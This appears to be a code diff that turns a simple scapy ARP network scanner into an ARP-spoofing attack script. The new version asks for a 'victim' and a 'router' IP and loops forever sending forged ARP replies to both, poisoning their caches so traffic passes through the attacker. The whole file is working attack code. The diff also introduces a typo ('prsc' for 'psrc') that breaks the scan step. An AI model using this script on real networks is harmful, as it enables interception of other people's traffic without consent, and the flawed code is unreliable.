@@ -1,27 +1,34 @@
 from scapy.all import ARP, Ether, srp   
 import scapy.all as scap
 
-target_ip = "192.168.0.1/24"
+print("Enter network ip : (example : 192.168.1.0/24)")
+target_ip = input()
 arp = ARP(pdst=target_ip)
 ether = Ether(dst="ff:ff:ff:ff:ff:ff")
 packet = ether/arp
 
 result = srp(packet, timeout=3, verbose=0)[0]
 
-clients = []
+ip = []
+mac = []
 
 for sent, received in result:
-    clients.append({'ip': received.psrc, 'mac': received.hwsrc})
+    ip.append(received.prsc)
+    mac.append(received.hwsrc)
 
-print("Available devices in the network:")
-print("IP" + " "*18+"MAC")
-for client in clients:
-    print("{:16}    {}".format(client['ip'], client['mac']))
+print("ips in the network", ip)
+print("macs in the network", mac)
+
+
+print("Enter victim ip")
+victim = input()
+print("Enter router ip")
+router = input()
 
 while True:
-    arp_response = ARP(pdst="10.10.3.11", hwdst="08:00:27:d8:18:28", psrc="10.10.3.254")
+    arp_response = ARP(pdst=victim, hwdst=mac[ip.index(victim)], psrc=router)
     scap.send(arp_response)
-    arp_response = ARP(pdst="10.10.3.254", hwdst="08:00:27:fc:be52", psrc="10.10.3.11")
+    arp_response = ARP(pdst=router, hwdst=mac[ip.index(router)], psrc=victim)
     scap.send(arp_response)
         
 
